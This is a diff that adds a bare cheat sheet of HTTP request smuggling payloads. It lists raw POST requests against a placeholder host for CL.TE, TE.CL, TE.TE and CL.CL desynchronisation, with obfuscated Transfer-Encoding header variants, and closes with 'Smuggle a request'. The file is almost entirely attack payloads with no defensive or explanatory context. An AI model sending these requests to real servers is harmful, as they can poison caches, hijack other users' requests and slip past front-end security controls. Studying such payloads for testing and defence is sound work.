@@ -1,0 +1,48 @@
+CL.TE
+  
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+
+TE.CL
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+3
+abc
+0
+
+X
+
+
+
+Phase 3: TE.TE
+Transfer-Encoding: chunked
+Transfer-Encoding: xchunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: chunked, identity
+
+
+Phase 4: CL.CL
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 10
+Content-Length: 3
+
+abc
+
+
+
+Smuggle a request
+  
